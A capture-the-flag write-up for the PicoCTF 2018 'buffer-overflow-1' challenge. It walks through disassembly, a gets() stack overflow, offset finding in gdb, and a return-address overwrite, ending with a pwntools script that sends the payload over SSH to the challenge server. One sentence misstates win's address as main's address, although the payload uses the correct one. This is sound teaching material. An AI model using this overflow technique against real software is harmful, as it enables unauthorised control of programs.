# Write-up for buffer-overflow-1 challenge
# PicoCTF_2018: buffer-overflow-1

**Category:** Binary Exploitation
**Points:** 200

> Okay now you're cooking! This time can you overflow the buffer and return to the flag function in this program? 
You can find it in /problems/buffer-overflow-1_3_af8f83fb19a7e2c98e28e325e4cacf78 on the shell server. Source

Let's run the program first.

```console
$ ./vuln
Please enter your string: 
AAAA
Okay, time to return... Fingers Crossed... Jumping to 0x80486b3
```
Okay, we see that it takes an input and then it jumps to an address. 
It's time to disassemble the program.

```asm
Dump of assembler code for function main:
   0x0804865d <+0>:	lea    ecx,[esp+0x4]
   0x08048661 <+4>:	and    esp,0xfffffff0
   0x08048664 <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048667 <+10>:	push   ebp
   0x08048668 <+11>:	mov    ebp,esp
   0x0804866a <+13>:	push   ecx
   0x0804866b <+14>:	sub    esp,0x14
   0x0804866e <+17>:	mov    eax,ds:0x804a03c
   0x08048673 <+22>:	push   0x0
   0x08048675 <+24>:	push   0x2
   0x08048677 <+26>:	push   0x0
   0x08048679 <+28>:	push   eax
   0x0804867a <+29>:	call   0x8048490 <setvbuf@plt>
   0x0804867f <+34>:	add    esp,0x10
   0x08048682 <+37>:	call   0x8048450 <getegid@plt>
   0x08048687 <+42>:	mov    DWORD PTR [ebp-0xc],eax
   0x0804868a <+45>:	sub    esp,0x4
   0x0804868d <+48>:	push   DWORD PTR [ebp-0xc]
   0x08048690 <+51>:	push   DWORD PTR [ebp-0xc]
   0x08048693 <+54>:	push   DWORD PTR [ebp-0xc]
   0x08048696 <+57>:	call   0x80484b0 <setresgid@plt>
   0x0804869b <+62>:	add    esp,0x10
   0x0804869e <+65>:	sub    esp,0xc
   0x080486a1 <+68>:	push   0x8048810
   0x080486a6 <+73>:	call   0x8048460 <puts@plt>
   0x080486ab <+78>:	add    esp,0x10
   0x080486ae <+81>:	call   0x804862f <vuln>
   0x080486b3 <+86>:	mov    eax,0x0
   0x080486b8 <+91>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x080486bb <+94>:	leave  
   0x080486bc <+95>:	lea    esp,[ecx-0x4]
   0x080486bf <+98>:	ret    
End of assembler dump.
```
`vuln()` is where we wanna go because it's probably vulnerable.

```asm
Dump of assembler code for function vuln:
   0x0804862f <+0>:	push   ebp
   0x08048630 <+1>:	mov    ebp,esp
   0x08048632 <+3>:	sub    esp,0x28
   0x08048635 <+6>:	sub    esp,0xc
   0x08048638 <+9>:	lea    eax,[ebp-0x28]
   0x0804863b <+12>:	push   eax
   0x0804863c <+13>:	call   0x8048430 <gets@plt>
   0x08048641 <+18>:	add    esp,0x10
   0x08048644 <+21>:	call   0x80486c0 <get_return_address>
   0x08048649 <+26>:	sub    esp,0x8
   0x0804864c <+29>:	push   eax
   0x0804864d <+30>:	push   0x80487d4
   0x08048652 <+35>:	call   0x8048420 <printf@plt>
   0x08048657 <+40>:	add    esp,0x10
   0x0804865a <+43>:	nop
   0x0804865b <+44>:	leave  
   0x0804865c <+45>:	ret    
End of assembler dump.
```

We found program's vulnerability: 

**0x0804863c <+13>:	call   0x8048430 <gets@plt>**

gets() function is  dangerous. See man page of gets:
```console
BUGS
       Never use gets().  Because it is impossible to tell without knowing the data in advance how many
       characters gets() will read, and because gets() will continue to store characters past  the  end
       of  the  buffer, it is extremely dangerous to use.  It has been used to break computer security.
       Use fgets() instead.
```


So, if we do a buffer overflow we can take control of the return address (return address is stored at $ebp + 0x4) and redirect program's execution.

But where we would like to jump?

Let's search for a suspicious function:
```console
$ objdump -t ./vuln
.
.
.
00000000       F *UND*	00000000              __libc_start_main@@GLIBC_2.0
080486d0 g     F .text	0000005d              __libc_csu_init
080485cb g     F .text	00000064              win
00000000       F *UND*	00000000              setvbuf@@GLIBC_2.0
00000000       F *UND*	00000000              fopen@@GLIBC_2.1
0804a044 g       .bss	00000000              _end
080484d0 g     F .text	00000000              _start
08048748 g     O .rodata	00000004              _fp_hw
0804a03c g     O .bss	00000004              stdout@@GLIBC_2.0
0804a03c g       .bss	00000000              __bss_start
0804865d g     F .text	00000063              main
00000000  w      *UND*	00000000              _Jv_RegisterClasses
0804a03c g     O .data	00000000              .hidden __TMC_END__
00000000       F *UND*	00000000              setresgid@@GLIBC_2.0
00000000  w      *UND*	00000000              _ITM_registerTMCloneTable
080483ec g     F .init	00000000              _init
```

Ohh, we found a win function lying at 0x0804865d. Nice, that's where we wanna return.

How could we do that?

gdb is here to help us:
Remember this instruction:
```asm
0x08048638 <+9>:	lea    eax,[ebp-0x28]
```
This tells us that buffer's size for our input is 0x28 (40 in decimal). 

```gdb
=> 0x0804863b <vuln+12>:	50	push   eax
(gdb) info registers
eax            0xffffcd90          -12912
ecx            0xffffffff          -1
edx            0xffffffff          -1
ebx            0x0                 0
esp            0xffffcd84          0xffffcd84
ebp            0xffffcdb8          0xffffcdb8
esi            0xf7fad000          -134557696
edi            0xf7fad000          -134557696
eip            0x804863b           0x804863b <vuln+12>
eflags         0x296               [ PF AF SF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
(gdb) x/32wx $esp
0xffffcd84:	0xf7fad000	0x0804a03c	0x0000001a	0xffffcdd8
0xffffcd94:	0xf7fe8e24	0x000003e8	0x00000000	0xf7fad000
0xffffcda4:	0xf7fad000	0xffffcdd8	0x080486ab	0x08048810
0xffffcdb4:	0x000003e8	0xffffcdd8	0x080486b3	0x00000001
0xffffcdc4:	0xffffce84	0xffffce8c	0x000003e8	0xf7fe39f0
0xffffcdd4:	0xffffcdf0	0x00000000	0xf7de2fb9	0xf7fad000
0xffffcde4:	0xf7fad000	0x00000000	0xf7de2fb9	0x00000001
0xffffcdf4:	0xffffce84	0xffffce8c	0xffffce14	0x00000001
```

So, 40 bytes seperate our input and the base of the stack (where previous ebp is stored). Inside ebp + 0x4 is return address, where
our program will return after RET instruction.
We are 44 bytes far from our goal (to change the return address).

So, if our input is 44 A's and the next 4 bytes are B's where would our program return?
Let's see:

```bash
python -c 'print "A"*44 + "B"*4' > payload
./vuln < payload
```

Running these commands we take:

```console
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x42424242
Segmentation fault (core dumped)
```

Exactly, we jumped to 0x42424242 which are the 4 B's(ascii-hex value of them).
Now, let's change the B's with the win's address.

```bash
python -c 'print "A"*44 + "\xcb\x85\x04\x08"' > payload
./vuln < payload
```

That's all. We did it.

> # Crafting python script

To get immediately the flag from the server of picoCTF we create a python script using pwn tools:

```python
#!/usr/bin/python

from pwn import *
import struct

user = 'XXXX'
pw = 'XXXX'

#crafting payload
payload = ''
payload += "A"*44
payload += struct.pack("I", 0x080485cb) #python helps us parse this as a string

#if input was 0x080485cd our program would read it in ascii format(which is something totally different).

s = ssh(host = '2018shell4.picoctf.com', user = user, password = pw)
s.set_working_directory('/problems/buffer-overflow-1_3_af8f83fb19a7e2c98e28e325e4cacf78')

r = s.process('./vuln')
print r.recv()
r.sendline(payload)
print r.recv()
r.close()
```

